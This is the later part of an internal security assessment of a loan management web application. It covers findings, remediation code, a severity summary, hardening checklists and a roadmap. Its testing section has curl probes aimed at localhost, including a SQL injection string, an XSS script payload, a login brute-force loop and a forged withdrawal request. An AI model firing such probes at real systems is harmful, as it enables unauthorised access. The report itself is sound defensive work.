- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-frontend/contexts/AuthContext.tsx:31`
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-frontend/lib/api.ts:3`

**Vulnerability:**
```typescript
const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8080/api';
```

Fallback to localhost could expose production app to SSRF or cause unexpected behavior.

**Remediation:**
```typescript
const API_URL = process.env.NEXT_PUBLIC_API_URL;

if (!API_URL) {
  throw new Error('NEXT_PUBLIC_API_URL environment variable is required');
}

if (!API_URL.startsWith('https://') && process.env.NODE_ENV === 'production') {
  throw new Error('Production API must use HTTPS');
}
```

---

## Security Headers Analysis

### Backend Security Headers (Good)

**Location:** `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/SecurityHeadersFilter.java`

**Current Implementation:**
```java
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: (configured but permissive)
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Issues:**
1. CSP allows `unsafe-inline` and `unsafe-eval` (HIGH risk)
2. HSTS disabled (commented out) - no HTTPS enforcement
3. X-XSS-Protection deprecated (use CSP instead)

**Recommended Headers:**
```java
httpResponse.setHeader("X-Frame-Options", "DENY");
httpResponse.setHeader("X-Content-Type-Options", "nosniff");

// Strict CSP (remove unsafe-inline/unsafe-eval in production)
httpResponse.setHeader("Content-Security-Policy",
    "default-src 'none'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self' data:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'");

httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
httpResponse.setHeader("Permissions-Policy",
    "geolocation=(), microphone=(), camera=(), payment=()");

// Enable HSTS for production
if (isProduction) {
    httpResponse.setHeader("Strict-Transport-Security",
        "max-age=31536000; includeSubDomains; preload");
}

// Remove X-XSS-Protection (deprecated, causes issues)
// Use CSP instead
```

---

## Dependency Vulnerabilities

### Backend Dependencies

**Versions Detected:**
- Spring Boot: 3.3.4 (Released September 2024)
- MySQL Connector: 8.3.0 (Released February 2024)
- JJWT: 0.12.6 (Released August 2024)
- Java: 21

**Vulnerability Status:** No known critical CVEs at assessment date

**Recommendations:**
1. Implement automated dependency scanning (Dependabot, Snyk, OWASP Dependency-Check)
2. Update schedule: Monthly security patches, quarterly major updates
3. Monitor CVE databases for Spring Boot, MySQL connector vulnerabilities

```xml
<!-- Add OWASP Dependency Check plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.7</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

---

### Frontend Dependencies

**Versions Detected:**
- Next.js: 16.0.3 (Latest)
- React: 19.2.0 (Latest)
- TypeScript: 5.x (Latest)

**Vulnerability Status:**
```json
{
  "vulnerabilities": {
    "critical": 0,
    "high": 0,
    "moderate": 0,
    "low": 0
  }
}
```

Clean bill of health for frontend dependencies at assessment date.

**Recommendations:**
```json
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "outdated": "npm outdated"
  }
}
```

---

## Cryptographic Implementation Review

### Password Hashing (Good)

**Location:** `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/SecurityConfig.java:80`

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

**Analysis:** Using BCrypt with default work factor (10 rounds). Good practice.

**Recommendation:** Consider increasing work factor for enhanced security:
```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // Increased from 10 to 12 rounds
}
```

---

### JWT Token Security (Mostly Good)

**Location:** `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/JwtTokenProvider.java`

**Positive Findings:**
- Using JJWT 0.12.6 (latest, secure version)
- HMAC-SHA256 signing algorithm
- Proper expiration (24 hours)
- Token validation includes signature verification

**Issues:**
- No token refresh mechanism (users must re-login every 24 hours)
- No revocation capability

**Recommendation:**
```java
// Implement refresh tokens
public String generateRefreshToken(String username) {
    Date now = new Date();
    Date expiryDate = new Date(now.getTime() + REFRESH_TOKEN_EXPIRATION);  // 7 days

    return Jwts.builder()
        .subject(username)
        .claim("type", "refresh")
        .issuedAt(now)
        .expiration(expiryDate)
        .signWith(getSigningKey())
        .compact();
}

@PostMapping("/auth/refresh")
public ResponseEntity<?> refreshToken(@RequestBody RefreshTokenRequest request) {
    String refreshToken = request.getRefreshToken();

    if (!tokenProvider.validateToken(refreshToken)) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(Map.of("error", "Invalid refresh token"));
    }

    String username = tokenProvider.getUsernameFromToken(refreshToken);
    String newAccessToken = tokenProvider.generateTokenFromUsername(username);

    return ResponseEntity.ok(Map.of("token", newAccessToken));
}
```

---

## Compliance & Regulatory Considerations

### GDPR Compliance Issues

**Violations Identified:**
1. **No data retention policy** - User data stored indefinitely
2. **Missing right to erasure** - No mechanism to fully delete user data
3. **No consent management** - No tracking of user consent for data processing
4. **Data breach notification** - No incident response plan
5. **Data export capability** - No API to export user data

**Remediation:**
```java
// Add data export endpoint
@GetMapping("/users/{id}/export")
@PreAuthorize("@userSecurity.isOwner(#id)")
public ResponseEntity<UserDataExport> exportUserData(@PathVariable Long id) {
    UserDataExport export = UserDataExport.builder()
        .user(userRepository.findById(id).orElseThrow())
        .loans(loanRepository.findByUserId(id))
        .transactions(transactionRepository.findByUserId(id))
        .supportTickets(ticketRepository.findByUserId(id))
        .exportDate(LocalDateTime.now())
        .build();

    return ResponseEntity.ok()
        .header("Content-Disposition", "attachment; filename=user-data.json")
        .body(export);
}

// Add complete data deletion
@DeleteMapping("/users/{id}/gdpr-delete")
@PreAuthorize("@userSecurity.isOwner(#id)")
public ResponseEntity<?> deleteUserDataGDPR(@PathVariable Long id) {
    // Soft delete or anonymize data based on legal requirements
    User user = userRepository.findById(id).orElseThrow();

    // Anonymize personal data
    user.setEmail("deleted_" + user.getId() + "@anonymized.local");
    user.setFullName("Deleted User");
    user.setPhone(null);
    user.setStatus("DELETED");
    userRepository.save(user);

    // Audit log
    auditLogService.logGDPRDeletion(user);

    return ResponseEntity.ok(Map.of("message", "User data deleted"));
}
```

---

### PCI-DSS Considerations (If Handling Cards)

**Current Status:** Application does not appear to store credit card data (good).

**If payment integration added:**
1. Use PCI-compliant payment gateway (Stripe, PayPal)
2. Never store CVV/CVC codes
3. Tokenize card data
4. Implement network segmentation
5. Regular penetration testing required

---

## Summary of Findings by Severity

### Critical (5 findings)
1. C-01: Missing Authorization Controls - No RBAC enforcement
2. C-02: CSRF Protection Disabled - All endpoints vulnerable
3. C-03: Sensitive Data in Debug Logs - Password hashes logged
4. C-04: No Role-Based Access Control - Authorization bypass
5. C-05: JWT in localStorage - XSS token theft risk

### High (8 findings)
1. H-01: JWT Secret Weak Entropy Validation
2. H-02: Mass Assignment Vulnerability - Privilege escalation
3. H-03: Missing Audit Logging - No fraud detection
4. H-04: Database Credentials in .env - Secret exposure
5. H-05: Insufficient Rate Limiting - Brute force attacks
6. H-06: Insecure Password Reset (future risk)
7. H-07: Missing CSP Headers - XSS risk
8. H-08: No Token Revocation - Compromised tokens valid 24hrs

### Medium (12 findings)
1. M-01: Account Lockout Bypass - In-memory storage
2. M-02: SQL Injection Risk - Unvalidated BigDecimal parsing
3. M-03: Token Expiration Not Tracked
4. M-04: Passwords in API Responses
5. M-05: CORS Origins Not Validated
6. M-06: Connection Pool Exhaustion
7. M-07: No Request Size Limits
8. M-08: No Input Sanitization
9. M-09: API URL Hardcoded
10. M-10: No HTTPS Enforcement
11. M-11: No Security Headers in Frontend
12. M-12: Missing GDPR Compliance Features

### Low (7 findings)
1. L-01: Verbose error messages expose system details
2. L-02: No API versioning strategy
3. L-03: Missing rate limit headers (Retry-After, X-RateLimit-*)
4. L-04: No request ID tracking for debugging
5. L-05: Database connection leak detection threshold too high
6. L-06: No health check authentication
7. L-07: Missing security.txt file

---

## Remediation Roadmap

### Phase 1: Immediate (Critical - 1 week)
1. Remove all debug logging statements exposing sensitive data
2. Implement role-based access control on all endpoints
3. Enable CSRF protection with SameSite cookies
4. Move JWT tokens to HttpOnly cookies
5. Remove .env from version control, rotate all secrets
6. Add authorization checks to financial endpoints

### Phase 2: High Priority (2-4 weeks)
1. Implement comprehensive audit logging
2. Add token revocation/blacklist mechanism
3. Fix mass assignment vulnerabilities with DTOs
4. Increase rate limiting on authentication endpoints
5. Add CSP headers to frontend
6. Implement connection pooling improvements

### Phase 3: Medium Priority (1-2 months)
1. Add GDPR compliance features (data export, deletion)
2. Implement request validation with proper DTOs
3. Add input sanitization throughout application
4. Configure CORS validation
5. Add HTTPS enforcement for production
6. Implement circuit breakers for database

### Phase 4: Long-term (3-6 months)
1. Set up automated dependency scanning
2. Implement security monitoring and alerting
3. Add WAF (Web Application Firewall)
4. Perform professional penetration testing
5. Implement secrets management (Vault/AWS Secrets Manager)
6. Add multi-factor authentication (MFA)

---

## Testing Recommendations

### Security Test Cases

```bash
# Test 1: Authorization Bypass
# Should FAIL (currently allows)
curl -X GET http://localhost:8080/api/users \
  -H "Authorization: Bearer <applicant-token>"

# Test 2: CSRF Attack
# Should FAIL (currently vulnerable)
curl -X POST http://localhost:8080/api/wallets/1/withdraw \
  -H "Authorization: Bearer <stolen-token>" \
  -d '{"amount": 1000}'

# Test 3: Rate Limiting
# Should block after 100 requests
for i in {1..101}; do
  curl -X POST http://localhost:8080/api/auth/login \
    -d '{"email":"test@example.com","password":"wrong"}'
done

# Test 4: SQL Injection (should be safe with parameterized queries)
curl -X GET "http://localhost:8080/api/users/1' OR '1'='1"

# Test 5: XSS in inputs
curl -X POST http://localhost:8080/api/auth/register \
  -d '{"email":"<script>alert(1)</script>@example.com","password":"Test123!"}'
```

---

## Monitoring & Alerting Recommendations

```java
// Implement security event monitoring
@Service
public class SecurityMonitoringService {

    @EventListener
    public void onAuthenticationFailure(AuthenticationFailureEvent event) {
        String username = event.getAuthentication().getName();
        String ip = getCurrentRequestIp();

        log.warn("Authentication failure: user={}, ip={}", username, ip);

        // Alert on multiple failures
        int failureCount = getRecentFailureCount(username, Duration.ofMinutes(5));
        if (failureCount > 10) {
            alertService.sendAlert(SecurityAlert.BRUTE_FORCE_ATTACK, username, ip);
        }
    }

    @EventListener
    public void onAccessDenied(AccessDeniedEvent event) {
        log.warn("Access denied: user={}, resource={}",
            event.getAuthentication().getName(),
            event.getResource());
    }

    @EventListener
    public void onLargeTransaction(TransactionEvent event) {
        if (event.getAmount().compareTo(new BigDecimal("10000")) > 0) {
            alertService.sendAlert(SecurityAlert.LARGE_TRANSACTION,
                event.getUserId(), event.getAmount());
        }
    }
}
```

---

## Hardened Defaults Checklist

### Backend Configuration

```yaml
# application-production.yml
server:
  port: 8080
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${KEYSTORE_PASSWORD}
    key-store-type: PKCS12

  tomcat:
    max-http-form-post-size: 1MB
    max-swallow-size: 1MB

  error:
    include-message: never
    include-stacktrace: never
    include-exception: false

spring:
  datasource:
    url: jdbc:mysql://${DB_HOST}:${DB_PORT}/${DB_NAME}?useSSL=true&requireSSL=true
    hikari:
      maximum-pool-size: 50
      minimum-idle: 10
      connection-timeout: 5000
      leak-detection-threshold: 30000

  security:
    require-ssl: true

jwt:
  secret: ${JWT_SECRET}  # Must be 256-bit minimum
  expiration: 3600000    # 1 hour (reduced from 24)

logging:
  level:
    com.loanweb: INFO  # No DEBUG in production
    org.springframework.security: WARN
```

### Security Headers Checklist

- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Content-Security-Policy: strict (no unsafe-inline/eval)
- [ ] Strict-Transport-Security: max-age=31536000 (HTTPS only)
- [ ] Referrer-Policy: strict-origin-when-cross-origin
- [ ] Permissions-Policy: restrictive
- [ ] X-Permitted-Cross-Domain-Policies: none

### Authentication & Authorization

- [ ] Strong password policy (12+ chars, complexity)
- [ ] Account lockout after 5 failed attempts
- [ ] JWT tokens in HttpOnly cookies (not localStorage)
- [ ] Token expiration: 1 hour (with refresh tokens)
- [ ] Token revocation capability
- [ ] Role-based access control on all endpoints
- [ ] Multi-factor authentication (MFA) for admin accounts

### Input Validation

- [ ] All inputs validated with Jakarta Validation
- [ ] Use DTOs (not Map<String, Object>)
- [ ] Parameterized SQL queries (JdbcTemplate - already done)
- [ ] Request size limits enforced
- [ ] File upload restrictions (size, type)

### Data Protection

- [ ] Passwords hashed with BCrypt (work factor 12+)
- [ ] Sensitive data encrypted at rest
- [ ] TLS 1.3 for data in transit
- [ ] Database connections encrypted (useSSL=true)
- [ ] No sensitive data in logs
- [ ] PII data anonymized in non-production environments

### Audit & Monitoring

- [ ] Comprehensive audit logging (who, what, when, where)
- [ ] Failed authentication attempts logged
- [ ] Authorization failures logged
- [ ] Financial transactions logged
- [ ] Admin actions logged
- [ ] Log aggregation (ELK, Splunk, CloudWatch)
- [ ] Security alerts configured

### Rate Limiting

- [ ] Global rate limit: 100 req/min per IP
- [ ] Login endpoint: 5 req/min per IP
- [ ] Registration endpoint: 3 req/5min per IP
- [ ] Password reset: 3 req/hour per IP
- [ ] Financial operations: 20 req/min per user

### Secrets Management

- [ ] No secrets in source code
- [ ] No secrets in .env files in version control
- [ ] Use external secrets manager (Vault, AWS Secrets)
- [ ] Secret rotation policy (quarterly)
- [ ] Separate secrets per environment

### Dependency Management

- [ ] Automated vulnerability scanning (Dependabot, Snyk)
- [ ] Monthly security patch updates
- [ ] Quarterly dependency updates
- [ ] No deprecated dependencies
- [ ] SBOM (Software Bill of Materials) generated

### Error Handling

- [ ] Generic error messages to users
- [ ] Detailed errors logged server-side only
- [ ] No stack traces exposed
- [ ] Custom error pages (no framework defaults)

### CORS Configuration

- [ ] Specific origins only (no wildcards)
- [ ] HTTPS origins only in production
- [ ] Credentials enabled only for trusted origins
- [ ] Limited HTTP methods
- [ ] Limited exposed headers

---

## Secure Deployment Checklist

### Pre-Deployment

- [ ] All Critical and High severity issues resolved
- [ ] Security headers configured
- [ ] HTTPS/TLS configured with valid certificate
- [ ] Secrets rotated and stored in secrets manager
- [ ] Database credentials changed from defaults
- [ ] CORS origins set to production domains only
- [ ] Debug logging disabled
- [ ] Error messages sanitized
- [ ] Dependency vulnerabilities scanned and resolved

### Production Environment

- [ ] Firewall configured (only ports 80/443 exposed)
- [ ] Database not publicly accessible
- [ ] Admin endpoints IP-whitelisted
- [ ] WAF (Web Application Firewall) deployed
- [ ] DDoS protection enabled
- [ ] Backup strategy implemented
- [ ] Incident response plan documented
- [ ] Security monitoring and alerting active

### Post-Deployment

- [ ] Penetration testing performed
- [ ] Security audit passed
- [ ] Compliance requirements met (GDPR, PCI-DSS)
- [ ] Bug bounty program considered
- [ ] Security training for development team
- [ ] Regular security reviews scheduled (quarterly)

---

## Conclusion

The PDM Loan Management System has a **moderate security posture** with significant vulnerabilities requiring immediate attention. The most critical issues are:

1. Complete lack of authorization controls allowing any authenticated user to access/modify any data
2. CSRF protection disabled making financial operations vulnerable
3. Sensitive data exposure in logs and API responses
4. JWT tokens stored insecurely in localStorage

**Immediate Actions Required:**
1. Implement role-based access control on all endpoints (1 week)
2. Enable CSRF protection with SameSite cookies (1 week)
3. Remove all sensitive data from logs (1 day)
4. Move JWT tokens to HttpOnly cookies (3 days)
5. Rotate all exposed secrets (.env file) (1 day)

**Overall Security Rating: C+ (Fair)**

With the recommended remediations implemented, the application could achieve a **B+ to A- rating** (Good to Very Good). The development team has demonstrated awareness of security best practices (password hashing, rate limiting, input validation) but needs to implement comprehensive authorization controls and secure session management.

---

**Report Prepared By:** Security Threat Modeling Analysis
**Date:** 2025-11-26
**Classification:** Confidential - Internal Use Only
**Retention:** 3 years or until superseded by updated assessment
